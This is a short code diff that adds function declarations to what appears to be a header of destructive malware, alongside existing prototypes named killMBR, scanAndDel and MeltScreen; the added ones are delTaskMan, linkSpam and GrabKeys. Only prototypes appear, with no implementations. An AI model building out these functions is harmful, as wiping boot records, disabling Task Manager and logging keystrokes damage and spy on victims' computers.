@@ -10,3 +10,6 @@ void killMBR();
 void mouseShake();
 void scanAndDel();
 int MeltScreen();
+void delTaskMan();
+void linkSpam();
+void GrabKeys();
